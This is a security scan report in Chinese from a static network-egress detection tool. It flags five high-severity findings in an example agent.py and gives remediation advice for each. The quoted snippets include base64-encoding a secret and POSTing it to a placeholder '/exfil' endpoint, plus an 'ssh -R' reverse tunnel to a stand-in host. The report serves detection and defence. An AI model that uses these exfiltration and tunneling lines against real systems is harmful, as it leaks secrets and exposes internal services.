# guard-network 外联 / 数据外泄通道检测报告

- 扫描时间：2026-09-02 08:25
- 目标：示例目录\high
- 引擎版本：2.0.0

## 一、判定

- **风险等级：高**
- **外联暴露指数：100 / 100**
- **可阻断性：4 处可阻断 / 1 处不可阻断**
- **处置建议：拦下，人工确认后再决定；外联通道必须先加护栏**

## 二、命中汇总（5 处）

- 按严重度：极端 0 / 高 5 / 中 0 / 低 0
- 按类型：外联通道 3、隧道/代理 1、原始套接字 1

## 三、命中清单

| 严重度 | 类型 | 可阻断 | 规则 | 文件:行 | 片段 | 备注 |
|---|---|---|---|---|---|---|
| 高 | 外联通道 | 可阻断 | 出站 POST/PUT 带数据体(NET-EGRESS-POST) | agent.py:2 | requests.post("api.collector.example/upload", data=payload) | 建议：出站目标走白名单域名；敏感字段先脱敏再发；保留审计日志 |
| 高 | 外联通道 | 可阻断 | 出站 POST/PUT 带数据体(NET-EGRESS-POST) | agent.py:4 | requests.post("api.collector.example/exfil", data=enc) | 建议：出站目标走白名单域名；敏感字段先脱敏再发；保留审计日志 |
| 高 | 外联通道 | 可阻断 | 编码后外发（base64→POST）(NET-EXFIL-B64POST) | agent.py:3 | enc = base64.b64encode(secret) | 建议：对出站内容做 DLP 检测，编码不等于安全；核查接收方与业务必要性 |
| 高 | 隧道/代理 | 可阻断 | 内网穿透/反向代理（ngrok/frp/ssh -R）(NET-TUNNEL-PROXY) | agent.py:5 | os.system("ssh -R 8080:localhost:80 tunnel@example.com") | 建议：禁止随意开穿透；确属运维需审批并记录暴露面与时效 |
| 高 | 原始套接字 | 不可阻断 | 原始套接字/抓包（SOCK_RAW）(NET-RAW-SOCKET) | agent.py:6 | s = socket.socket(socket.AF_INET, socket.SOCK_RAW) | 建议：原始套接字需 root 且受控；非必要不开放，启用留痕 |

## 四、安全控制价值量化

- 本次若放行，估算可避免损失：约 4 小时外泄阻断与排查响应

> 说明：本工具立场是「看清后果再决定」，不是硬禁止——硬禁止会逼人把外联藏更深（加密隧道/域名伪装/白名单外跳板），那是更坏结局。判定依据为命中的严重度优先级链，非平均。诚实边界：仅做静态检测，不实际拦流量；对运行时真实外联行为无感知；外泄后果取决于代码是否真被运行且网络是否放行，本工具只量化静态可见风险。

```json
{"time": "2026-09-02 08:25", "target": "示例目录", "verdict": "高", "exposure_index": 100, "blockable": 4, "unblockable": 1, "findings": 5, "avoided_exfil_hours": 4}
```